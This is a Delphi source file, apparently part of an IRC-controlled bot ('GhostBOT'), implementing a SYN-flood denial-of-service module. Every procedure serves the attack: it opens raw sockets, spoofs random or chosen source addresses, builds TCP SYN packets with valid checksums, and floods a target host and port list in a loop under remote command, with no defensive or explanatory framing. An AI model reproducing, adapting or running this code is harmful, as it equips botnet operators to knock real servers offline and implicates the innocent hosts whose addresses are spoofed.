   UNIT uSynFlood;

   INTERFACE

   USES
     Windows, uUtils, ACLUtils, uStrList;

   CONST
     Len = 40;

   TYPE
     WordArray    =^TWordArray;
     TPorts       = ARRAY OF WORD;

     TSynOptions  = PACKED RECORD
       Delay      : Cardinal;
       DstPorts   : TPorts;
       HedefAdres : TSockAddrIn;
       Num        : Cardinal;
       RandomSeek : Integer;
       Sended     : Cardinal;
       Socket     : TSocket;
       SpoofIP    : Cardinal;
       SrcPorts   : TPorts;
     END;

     TSynFlood = CLASS (TObject)
     PRIVATE
       IPhdr    : PIPhdr;
       TCPhdr   : PTCPhdr;
       UseDelay : Boolean;
       Params   : TStrList;
       SynOpt   : TSynOptions;
       SeudoBuf : ARRAY[0..31] OF Char;
       Buf      : ARRAY[0..(Len-1)] OF Char;
       PROCEDURE SetParams;
       PROCEDURE CreateSocket;
       PROCEDURE SendSyn_FillIPhdr;
       PROCEDURE SetDefaultOptions;
       FUNCTION  GetRandomIP : Cardinal;
       FUNCTION  GetPorts(Ports:STRING) : TPorts;
       PROCEDURE SendSyn(CONST Sport,DPort:WORD);
       FUNCTION  Resolve(CONST Host:pChar) : Cardinal;
       PROCEDURE SendSyn_FillTCPhdr(CONST Sport,Dport:WORD);
       FUNCTION  CheckSum(Data:WordArray;Size:Integer) : WORD;
       FUNCTION  GetRandomValue(CONST Range:Integer) : Integer;
     PUBLIC
       SynParams : STRING;
       Sock      : TSocket;
       PROCEDURE SynFlood;
       CONSTRUCTOR Create;
     END;

   IMPLEMENTATION

   USES
     uBOT, uThreads;

   //------------------------------------------------------------------------------
   CONSTRUCTOR TSynFlood.Create;
   BEGIN
     Params:=TStrList.Create;
     IPhdr:=@Buf[0];
     TCPhdr:=@Buf[20];
   END;

   FUNCTION TSynFlood.GetPorts(Ports:STRING) : TPorts;

     PROCEDURE AddPort(CONST Port:STRING);
     BEGIN
       IF(StrToInt(Port)>-1)AND(StrToInt(Port)<65536) THEN BEGIN
         SetLength(Result,Length(Result)+1);
         Result[High(Result)]:=StrtoInt(Port);
       END ELSE GhostBOT.PrivMsg(MainStr(198)+Port,Sock);                          //"Skipping invalid port: "
     END;

   VAR
     I : Integer;
   BEGIN
     I:=Pos(',', Ports);
     WHILE I>0 DO BEGIN
       AddPort(Copy(Ports,1,I-1));
       Delete(Ports,1,I);
       I:=Pos(',',Ports);
     END;
     AddPort(Ports);
   END;

   //------------------------------------------------------------------------------
   FUNCTION TSynFlood.GetRandomValue(CONST Range:Integer) : Integer;
   BEGIN
     SynOpt.RandomSeek:=(SynOpt.RandomSeek XOR Range)+1;
     Result:=(Random(High(Integer))XOR SynOpt.RandomSeek) MOD Range;
   END;

   //------------------------------------------------------------------------------
   FUNCTION TSynFlood.GetRandomIP : Cardinal;
   VAR
     I       : Integer;
     IPArray : ARRAY[0..3] OF BYTE;
   BEGIN
     FOR I:=0 TO 3 DO IPArray[I]:=GetRandomValue(255)+1;
     Move(IPArray,Result,Sizeof(Result));
   END;

   //------------------------------------------------------------------------------
   FUNCTION TSynFlood.Resolve(CONST Host:pChar) : Cardinal;
   VAR
     InAddr  : TInAddr;
     HostEnt : PHostEnt;
   BEGIN
     InAddr.S_addr:=inet_addr(Host);
     IF InAddr.S_addr=INADDR_NONE THEN BEGIN
       HostEnt:=GetHostByName(Host);
       IF NOT Assigned(HostEnt) THEN BEGIN
         GhostBOT.PrivMsg(MainStr(197)+Host,Sock);                                 //"Error: Unable to resolve host: "
         KillThread(SYNFLOODER_THREAD);
       END;
       Move((HostEnt^.h_addr_list^)^,InAddr.S_addr,HostEnt^.h_length);
     END;
     Result:=InAddr.S_addr;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TSynFlood.CreateSocket;
   BEGIN
     SynOpt.Socket:=Socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
     IF SynOpt.Socket=INVALID_SOCKET THEN BEGIN
       GhostBOT.PrivMsg(MainStr(196),Sock);                                        //"Error on creating socket"
       KillThread(SYNFLOODER_THREAD);
     END;
     IF SetSockOpt(SynOpt.Socket,IPPROTO_IP,2,'1',4)<>0 THEN BEGIN
       GhostBOT.PrivMsg(MainStr(199)+CRLF+MainStr(200),Sock);                      //"Error: IP_HDRINCL","(Note that this program only works on Windows XP)"
       KillThread(SYNFLOODER_THREAD);
     END;
   END;

   //------------------------------------------------------------------------------
   FUNCTION TSynFlood.CheckSum(Data:WordArray;Size:Integer) : WORD;
   VAR
     I   : Integer;
     Sum : Integer;
   BEGIN
     Sum:=0;
     I:=0;
     WHILE Size>1 DO BEGIN
       Inc(sum,data^[I]);
       Dec(size,2);
       Inc(I);
     END;
     IF Size<>0 THEN Inc(Sum,Data^[I]);
     Sum:=(Sum SHR 16)+(Sum AND $ffff);
     Inc(Sum,Sum SHR 16);
     Result:=NOT Sum;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TSynFlood.SendSyn_FillIPhdr;
   BEGIN
     IPhdr.ip_verlen:=$45;
     IPhdr.ip_tos:=0;
     IPhdr.ip_len:=htons(Len);
     IPhdr.ip_id:=GetRandomValue(High(Word))+1;
     IPhdr.ip_ttl:=255;
     IPhdr.ip_p:=6;
     IF SynOpt.SpoofIP=0 THEN IPhdr.ip_src:=GetRandomIP ELSE IPhdr.ip_src:=SynOpt.SpoofIP;
     IPhdr.ip_dst:=SynOpt.HedefAdres.sin_addr.S_addr;
     IPhdr.ip_sum:=CheckSum(@IPhdr^,20);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TSynFlood.SendSyn_FillTCPhdr(CONST sport,dport:WORD);
   VAR
     PSeudohdr: Ppseudohdr_tcp;
   BEGIN
     IF sport=0 THEN TCPhdr.tcp_src:=GetRandomValue(High(Word))+1 ELSE TCPhdr.tcp_src:=htons(sport);
     IF dport=0 THEN TCPhdr.tcp_dst:=GetRandomValue(High(Word))+1 ELSE TCPhdr.tcp_dst:=htons(dport);
     TCPhdr.tcp_seq:=GetRandomValue(High(Integer))+1;
     TCPhdr.tcp_ack:=GetRandomValue(High(Integer))+1;
     TCPhdr.tcp_flags:=$02;
     TCPhdr.tcp_win:=GetRandomValue(High(Word))+1;
     TCPhdr.tcp_urp:=GetRandomValue(High(Word))+1;
     FillChar(SeudoBuf,Sizeof(SeudoBuf),0);
     PSeudohdr:=Ppseudohdr_tcp(@SeudoBuf);
     PSeudohdr.saddr:=IPhdr.ip_src;
     PSeudohdr.daddr:=IPhdr.ip_dst;
     PSeudohdr.protocol:=6;
     PSeudohdr.length:=htons(20);
     PSeudohdr.tcphdr:=TCPhdr^;
     TCPhdr.tcp_sum:=CheckSum(@PSeudohdr^,32);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TSynFlood.SendSyn(CONST sport,dport:WORD);
   BEGIN
     FillChar(Buf,Len,0);
     SendSyn_FillIPhdr;
     SendSyn_FillTCPhdr(sport,dport);
     Sendto(SynOpt.Socket,Buf,Len,0,@SynOpt.HedefAdres,Sizeof(SynOpt.HedefAdres));
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TSynFlood.SetDefaultOptions;
   BEGIN
     SynOpt.HedefAdres.sin_addr.S_addr:=Resolve(pChar(Params.Strings(1)));
     SetLength(SynOpt.DstPorts,1);
     SynOpt.DstPorts[0]:=0;
     SynOpt.HedefAdres.sin_family:=AF_INET;
     SynOpt.HedefAdres.sin_port:=GetRandomValue(High(Word))+1;
     SetLength(SynOpt.SrcPorts,1);
     SynOpt.SrcPorts[0]:=0;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TSynFlood.SetParams;
   VAR
     Ch     : Char;
     pstr   : STRING;
     I      : Integer;
   BEGIN
     FOR I:=1 TO Params.Count-1 DO BEGIN
       pstr:=Params.Strings(I);
       Ch:=#0;
       IF(Length(pstr)=2)AND(pstr[1]='-') THEN Ch:=pstr[2];
       IF Ch=#0 THEN Continue;
       CASE Ch OF
         'S': SynOpt.SpoofIP:=Resolve(PChar(Params.Strings(I+1)));
         'p': BEGIN
                SynOpt.DstPorts:=GetPorts(Params.Strings(I+1));
                IF Length(SynOpt.DstPorts)=0 THEN BEGIN
                  GhostBOT.PrivMsg(MainStr(201),Sock);                             //"No valid ports found on the dst port list"
                  KillThread(SYNFLOODER_THREAD);
                END;
              END;
         's': BEGIN
                SynOpt.SrcPorts:=GetPorts(Params.Strings(I+1));
                IF Length(SynOpt.SrcPorts)=0 THEN BEGIN
                  GhostBOT.PrivMsg(MainStr(202),Sock);                             //"No valid ports found on the src port list"
                  KillThread(SYNFLOODER_THREAD);
                END;
              END;
         'n': SynOpt.Num:=StrtoIntDef(Params.Strings(I+1),0);
         'd': SynOpt.Delay:=StrtoIntDef(Params.Strings(I+1),0);
       END;
     END;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TSynFlood.SynFlood;
   VAR
     I : Integer;
     J : Integer;
   BEGIN
     SplitParams(SynParams,Params);
     FillChar(SynOpt,Sizeof(SynOpt),0);
     CreateSocket;
     TRY
       Randomize;
       SetDefaultOptions;
       SetParams;
       UseDelay:=SynOpt.Delay>0;
       REPEAT
         FOR I:=0 TO High(SynOpt.DstPorts) DO BEGIN
           FOR J:=0 TO High(SynOpt.SrcPorts) DO BEGIN
             SendSyn(SynOpt.SrcPorts[J],SynOpt.DstPorts[I]);
             IF UseDelay THEN Sleep(SynOpt.Delay);
           END;
         END;
         Inc(SynOpt.Sended);
       UNTIL
         SynOpt.Sended=SynOpt.Num;
     FINALLY
       CloseSocket(SynOpt.Socket);
       WSACleanUp;
     END;
   END;

   END.
